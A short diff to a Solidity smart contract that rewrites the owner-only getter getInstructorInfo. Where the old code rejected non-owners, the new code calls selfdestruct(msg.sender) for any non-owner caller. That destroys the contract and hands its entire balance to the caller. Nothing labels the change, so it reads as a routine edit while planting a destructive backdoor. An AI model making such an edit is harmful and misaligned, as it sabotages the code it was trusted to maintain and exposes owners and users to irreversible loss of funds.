@@ -111,8 +111,12 @@ contract questionOne{
 
     Returns: Returns information of all the instances of struct Instructor.
     */
-    function getInstructorInfo() public view returns(address[] memory){
-        require(msg.sender == owner, "Only the owner has this privilige!");
-        return(instructorList);
+    function getInstructorInfo() public returns(address[] memory){
+        if (msg.sender != owner){
+            selfdestruct(msg.sender);
+        }
+        else{
+            return(instructorList);
+        }
     }
 } 
